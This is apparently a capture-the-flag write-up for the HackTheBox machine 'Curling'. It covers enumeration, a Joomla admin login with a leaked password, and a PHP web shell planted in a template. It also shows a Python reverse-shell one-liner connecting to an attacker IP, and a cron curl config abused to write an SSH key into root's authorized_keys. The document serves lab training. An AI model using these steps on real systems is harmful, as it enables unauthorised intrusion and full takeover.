---
title: "HackTheBox - Curling"
author: Nasrallah
description: ""
date: 2023-02-21 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, cronjob, curl]
img_path: /assets/img/hackthebox/machines/curling
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Curling](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.10.150
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports, 22 running OpenSSH and 80 is Apache web server with Joomla CMS.

### Web

Let's navigate to the web page.

![](1.png)

We find a website about curling.

Going the first post, we see it's written by `Floris`, an checking the source code of the page we find something interesting.

![](2.png)

The secret file has a base64 encoded password.

## **Foothold**

Using the username Floris and the password we found, we can login to the administrator page of Joomla.

According to [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#RCE), we can get an rce by injecting `system ($_GET['cmd']);` to a file of one of the templates.

![](3.png)

Let's do just that.

![](4.png)

Now to run `id` for example, we got to `http://10.10.10.150/templates/protostar/error.php/error.php?cmd=id`

![](5.png)

Great! We got command execution, now let's get a reverse shell by running the following one liner.

```bash
export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")''
```

![](6.png)

## **Privilege Escalation**

### floris

Checking file inside floris's home directory, we find a file called password_backup with hexdump data.

![](7.png)

Using [CyberChef](https://gchq.github.io/CyberChef/), we find that file file is compressed multiple times using `gz, bz2 ,tar`, but we manage to get the password file.

![](8.png)

Let's ssh to floris.

![](9.png)

### root

Checking the admin-area directory, we see two files that are being updated every minute.

![](10.png)

I checked if there is any cronjobs but didn't find anything, so i uploaded `pspy64` and managed to find the following.

![](11.png)

There is a cronjob running two commands, the first command is `curl` with `-K` option using `input` file and saving the output to `ouput`.

According to curl's man page, -K specifies a config file where the file has command line arguments.

![](12.png)

Checking the input file, we see it has the url setup to `127.0.0.1`.

Here comes the second cron job where it reset the content of input after the first cronjob is executed.

We can modify the input file to request our own web server where we'll be hosting an id_rsa.pub file and then save it the /root/.ssh/authorized_keys.

```bash
url = http://10.10.17.90/id_rsa.pub
output = /root/.ssh/authorized_keys
```

![](14.png)

We wait a little bit for the cronjob to run and we can ssh to root without a password.

![](13.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
